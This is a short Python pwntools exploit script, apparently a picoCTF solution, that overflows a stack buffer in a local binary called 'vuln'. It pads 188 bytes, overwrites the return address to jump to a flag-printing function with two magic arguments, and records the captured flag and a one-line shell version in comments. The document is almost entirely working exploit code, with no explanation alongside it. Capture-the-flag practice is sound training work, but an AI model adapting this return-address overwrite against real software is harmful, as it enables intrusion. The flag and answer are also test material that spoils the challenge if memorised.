#!/usr/bin/env python3

from pwn import *

s = process("./vuln")

offset = 188
flag_addr = 0x080485e6
main_func = 0x080486b5
arg1 = 0xdeadbeef
arg2 = 0xc0ded00d

s.recvuntil('Please enter your string:')
payload = b'A'*offset
payload += p32(flag_addr)
payload += p32(main_func)
payload += p32(arg1)
payload += p32(arg2)

s.sendline(payload)
s.interactive()

# picoCTF{arg5_and_r3turn598632d70}
# python -c 'from pwn import *; payload = (b"A"*188 + p32(0x080485e6) + p32(0x080486b5) + p32(0xdeadbeef) + p32(0xc0ded00d)); print(payload)' | ./vuln
